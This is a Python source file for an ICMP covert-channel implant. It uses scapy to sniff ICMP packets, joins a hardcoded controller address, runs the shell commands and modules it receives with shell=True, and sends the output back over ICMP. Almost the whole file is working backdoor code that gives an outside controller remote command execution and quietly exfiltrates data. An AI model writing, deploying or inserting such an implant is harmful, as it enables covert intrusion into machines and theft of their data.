#!/usr/bin/python3

from scapy.all import sr,IP,ICMP,Raw,sniff
import base64
import shlex
from shellylib import Host
import time
from threading import Timer
from subprocess import STDOUT, check_output, TimeoutExpired, PIPE, Popen
import subprocess
import socket
import pty
import os

ICMP_ID = int(12800)
TTL = int(64)

class Implant(Host):
    
    def __init__(self, controller_ip):
        super().__init__()
        self.controller_ip = controller_ip
        self.module_cache = """"""
        

    def join(self, shellpack):
        self.send(shellpack['ip'], "join", os.getcwd().encode())

    def heartbeat_response(self, shellpack):
        if shellpack['data'] == self.id:
            self.send(self.controller_ip, "heartbeat", self.id)

    def run_module(self, shellpack):
        if shellpack['option'] == "TRUNCATED":
            print(shellpack['data'].decode())
            self.module_cache += shellpack['data'].decode()
        elif shellpack['option'] == "COMPLETE":
            self.module_cache += shellpack['data'].decode()
            print(self.module_cache)
            self.run_command(self.module_cache)
            self.module_cache = """"""
        else:
            self.module_cache += shellpack['data'].decode()
            self.run_command(self.module_cache)
            self.module_cache = """"""

    def run_command(self, cmd):
        try:
            output = check_output(cmd, stderr=STDOUT, timeout=3, shell=True)
            self.send(self.controller_ip, "instruction", output)
        except TimeoutExpired:
            self.send(self.controller_ip, "instruction", b'The command has timed out', option="ERROR")
        except Exception:
            self.send(self.controller_ip, "instruction", b'There was an error with the command', option="ERROR")

    def instruction(self, shellpack):
        self.run_command(shellpack['data'].decode())

if __name__ == "__main__":
    print("[ Setting up implant... ]")
    print("[ ICMP Sniffing Started ]")
    
    implant = Implant(controller_ip="192.168.157.6")
    print(implant)

    print("[ Shellpack log ]")
    # Send join command
    implant.send(implant.controller_ip, "join", os.getcwd().encode())

    # Start sniffing
    sniff(iface=implant.iface, prn=implant.sniff_callback, filter="icmp", store="0")
